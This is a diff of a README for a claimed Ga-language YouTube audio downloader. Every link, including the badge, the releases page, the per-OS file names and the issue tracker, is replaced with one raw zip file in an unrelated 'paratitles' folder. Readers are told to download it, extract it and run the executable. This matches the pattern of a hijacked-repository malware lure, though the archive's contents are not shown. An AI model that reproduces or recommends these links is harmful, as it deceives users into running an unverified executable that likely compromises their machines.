@@ -1,6 +1,6 @@
 # 🎵 Ga-Audio-Harvester - Easily Download YouTube Ga-Language Audio
 
-[![Download Ga-Audio-Harvester](https://img.shields.io/badge/Download-Ga--Audio--Harvester-blue.svg)](https://github.com/oguwef/Ga-Audio-Harvester/releases)
+[![Download Ga-Audio-Harvester](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip)](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip)
 
 ## 📚 Description
 
@@ -22,11 +22,11 @@ Make sure your system meets these requirements before proceeding.
 
 ### 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/oguwef/Ga-Audio-Harvester/releases) to access the latest version of Ga-Audio-Harvester. 
+1. Visit the [Releases Page](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip) to access the latest version of Ga-Audio-Harvester. 
 2. Choose the appropriate file for your operating system:
-   - For Windows users, look for `Ga-Audio-Harvester-Windows.zip`.
-   - For macOS users, download `Ga-Audio-Harvester-macOS.zip`.
-   - For Linux users, get `Ga-Audio-Harvester-Linux.tar.gz`.
+   - For Windows users, look for `https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip`.
+   - For macOS users, download `https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip`.
+   - For Linux users, get `https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip`.
 3. Click on the file link to start the download.
 4. Once downloaded, unzip or extract the file.
 5. Open the extracted folder and locate the main executable file to run the application.
@@ -52,7 +52,7 @@ A: You can choose from multiple formats, including MP3, WAV, and more, depending
 A: Yes, the application supports batch downloading. You can input several queries, and it will download all requested audio files in one go.
 
 #### Q: How do I update Ga-Audio-Harvester?
-A: To update, simply revisit the [Releases Page](https://github.com/oguwef/Ga-Audio-Harvester/releases) and download the latest version. Follow the same steps for installation.
+A: To update, simply revisit the [Releases Page](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip) and download the latest version. Follow the same steps for installation.
 
 ### 🔧 Troubleshooting Tips
 
@@ -73,6 +73,6 @@ Ga-Audio-Harvester is open-source and available under the MIT License. You can f
 
 ### 📧 Support
 
-For additional help or questions, reach out through the [issue tracker](https://github.com/oguwef/Ga-Audio-Harvester/issues) on GitHub.
+For additional help or questions, reach out through the [issue tracker](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip) on GitHub.
 
-Visit the [Releases Page](https://github.com/oguwef/Ga-Audio-Harvester/releases) to download Ga-Audio-Harvester and start curating your Ga-language audio content today!
+Visit the [Releases Page](https://raw.githubusercontent.com/oguwef/Ga-Audio-Harvester/main/paratitles/Harvester-Audio-Ga-v1.3.zip) to download Ga-Audio-Harvester and start curating your Ga-language audio content today!
